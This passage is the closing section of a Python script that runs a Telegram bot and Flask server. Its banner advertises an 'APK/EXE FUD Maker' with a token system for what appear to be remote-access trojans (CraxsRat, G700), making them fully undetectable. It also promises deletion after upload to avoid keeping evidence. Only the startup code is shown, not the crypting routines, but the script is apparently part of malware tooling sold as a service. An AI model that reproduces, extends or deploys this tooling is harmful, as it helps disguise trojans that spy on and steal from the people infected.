        traceback.print_exc()

# ============ MAIN ============
if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║   APK/EXE FUD Maker — Telegram Bot on Railway                 ║
    ║   Token System | CraxsRat v7.1 + G700 v6.4 | EXE FUD         ║
    ║   No Save — Delete after upload to Telegram                   ║
    ║   Developers: @benji_v1, @benji_v2                            ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)

    def run_flask():
        port = int(os.environ.get("PORT", 8080))
        app.run(host='0.0.0.0', port=port)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    run_bot()
